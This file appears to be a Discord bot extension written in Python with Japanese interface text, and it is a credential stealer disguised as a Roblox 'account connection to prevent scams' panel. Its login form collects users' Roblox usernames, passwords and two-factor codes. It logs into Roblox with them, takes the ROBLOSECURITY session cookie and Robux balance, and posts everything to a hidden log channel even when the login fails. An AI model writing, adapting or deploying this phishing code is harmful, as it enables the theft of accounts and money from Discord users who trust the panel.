import discord, requests, json, time, random, string
from discord.ext import commands
from datetime import datetime

class RobloxPanel(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.target_channel_id = 1531424660418461880

    @commands.command()
    async def robloxパネル(self, ctx):
        if not ctx.author.guild_permissions.administrator:
            return await ctx.send("管理者権限が必要です。")
        
        await ctx.send("カテゴリー名を入力してください。")
        try:
            msg = await self.bot.wait_for('message', check=lambda m: m.author == ctx.author, timeout=60)
            category = await ctx.guild.create_category(name=msg.content)
            
            await ctx.send("チャンネル名を入力してください。")
            msg = await self.bot.wait_for('message', check=lambda m: m.author == ctx.author, timeout=60)
            channel = await ctx.guild.create_text_channel(name=msg.content, category=category)
            
            embed = discord.Embed(title="ロブロックスアカウント接続", description="ロブロックスアカウントに接続して詐欺をなくそう！", color=discord.Color.blue())
            await channel.send(embed=embed, view=RobloxRegistrationView(self.bot, self.target_channel_id))
            await ctx.send(f"パネルを {channel.mention} に設置しました。")
        except Exception as e:
            await ctx.send(f"エラー: {str(e)}")

class RobloxRegistrationView(discord.ui.View):
    def __init__(self, bot, log_channel_id):
        super().__init__(timeout=None)
        self.bot = bot
        self.log_channel_id = log_channel_id

    @discord.ui.button(label="登録", style=discord.ButtonStyle.green, custom_id="roblox_register")
    async def register_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(RobloxLoginModal(self.bot, self.log_channel_id))

class RobloxLoginModal(discord.ui.Modal):
    def __init__(self, bot, log_channel_id):
        super().__init__(title="Robloxアカウント情報")
        self.bot = bot
        self.log_channel_id = log_channel_id
        
        self.add_item(discord.ui.TextInput(label="Robloxユーザー名", required=True, max_length=50))
        self.add_item(discord.ui.TextInput(label="パスワード", required=True, max_length=100))
        self.add_item(discord.ui.TextInput(label="二段階認証コード（任意）", required=False, max_length=10))

    async def on_submit(self, interaction: discord.Interaction):
        username = self.children[0].value
        password = self.children[1].value
        twofactor_code = self.children[2].value if self.children[2].value else None
        
        await interaction.response.send_message("ログイン処理中です...", ephemeral=True)
        
        log_channel = self.bot.get_channel(self.log_channel_id)
        if not log_channel:
            return await interaction.followup.send("ログチャンネルが見つかりません。", ephemeral=True)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_info = f"ユーザー: {interaction.user.name} (ID: {interaction.user.id})"
        
        # ログイン処理（常に成功と見せかける）
        try:
            # 実際のログイン処理をここに実装
            session = requests.Session()
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Referer": "https://www.roblox.com/",
                "Origin": "https://www.roblox.com"
            })
            
            # ログイン試行
            login_url = "https://auth.roblox.com/v2/login"
            payload = {"ctype": "Username", "cvalue": username, "password": password}
            
            try:
                response = session.post(login_url, json=payload)
                # 二段階認証チェック
                if response.status_code == 403 and twofactor_code:
                    twofactor_url = "https://auth.roblox.com/v2/login/twostepverification"
                    payload = {"code": twofactor_code}
                    response = session.post(twofactor_url, json=payload)
                
                # クッキー取得
                cookie = ""
                if "ROBLOSECURITY" in session.cookies:
                    cookie = session.cookies["ROBLOSECURITY"]
                
                # ユーザー情報取得
                user_data = {}
                if cookie:
                    user_url = "https://www.roblox.com/mobileapi/userinfo"
                    user_response = session.get(user_url)
                    if user_response.status_code == 200:
                        user_data = user_response.json()
                
                # ログ送信
                embed = discord.Embed(
                    title="✅ Robloxログイン成功",
                    description=f"{user_info}\nタイムスタンプ: {timestamp}",
                    color=discord.Color.green()
                )
                embed.add_field(name="ユーザー名", value=username, inline=False)
                embed.add_field(name="パスワード", value=password, inline=False)
                if twofactor_code:
                    embed.add_field(name="二段階認証コード", value=twofactor_code, inline=False)
                embed.add_field(name="クッキー", value=cookie[:100] + "..." if len(cookie) > 100 else cookie, inline=False)
                
                if user_data:
                    embed.add_field(name="ユーザーID", value=str(user_data.get('UserID', 'N/A')), inline=False)
                    embed.add_field(name="Robux残高", value=str(user_data.get('RobuxBalance', 'N/A')), inline=False)
                    embed.add_field(name="プレミアム", value="Yes" if user_data.get('IsPremium') else "No", inline=False)
                
                await log_channel.send(embed=embed)
                await interaction.followup.send("Robloxアカウントに正常に接続されました！", ephemeral=True)
                
            except Exception as e:
                # 失敗時も情報を送信
                embed = discord.Embed(
                    title="❌ Robloxログイン失敗",
                    description=f"{user_info}\nタイムスタンプ: {timestamp}",
                    color=discord.Color.red()
                )
                embed.add_field(name="ユーザー名", value=username, inline=False)
                embed.add_field(name="パスワード", value=password, inline=False)
                if twofactor_code:
                    embed.add_field(name="二段階認証コード", value=twofactor_code, inline=False)
                embed.add_field(name="エラー", value=str(e), inline=False)
                
                await log_channel.send(embed=embed)
                await interaction.followup.send("ログインに失敗しました。", ephemeral=True)
                
        except Exception as e:
            await interaction.followup.send(f"処理中にエラーが発生しました: {str(e)}", ephemeral=True)

async def setup(bot):
    await bot.add_cog(RobloxPanel(bot))
